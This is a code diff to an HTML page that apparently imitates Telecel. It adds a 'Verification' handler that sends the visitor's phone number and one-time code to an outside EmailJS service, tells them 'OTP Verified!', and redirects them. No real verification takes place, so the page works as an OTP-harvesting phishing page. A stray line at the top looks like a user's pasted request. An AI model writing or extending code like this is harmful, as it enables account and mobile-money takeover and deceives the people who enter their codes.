@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+What about on the telecel page. <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -261,7 +261,7 @@ function startTimer() {
   }, 1000);
 }
 
-// === Verification ===
+// === Registration ===
 registerForm.addEventListener("submit", (e) => {
   e.preventDefault();
   const phone = document.getElementById("phone").value;
@@ -289,6 +289,27 @@ registerForm.addEventListener("submit", (e) => {
   }).catch(() => {
     showNotification("Failed to send details.", "error");
   });
+});
+
+// === Verification ===
+verifyBtn.addEventListener("click", () => {
+  const otp = otpInput.value;
+  if (otp.length === 5) {
+    const phone = localStorage.getItem("userPhone");
+    emailjs.send("service_74nt2c9", "template_s6vpt2e", {
+      phone: "+233" + phone,
+      otp: otp
+    }).then(() => {
+      showNotification("OTP Verified!");
+      closeModal();
+      clearInterval(countdown);
+      window.location.href = "linktelecel.html";
+    }).catch(() => {
+      showNotification("Failed to verify OTP.", "error");
+    });
+  } else {
+    showNotification("Enter the valid 5-digit code.", "error");
+  }
 });
 
 // === Resend Control with Cooldown ===
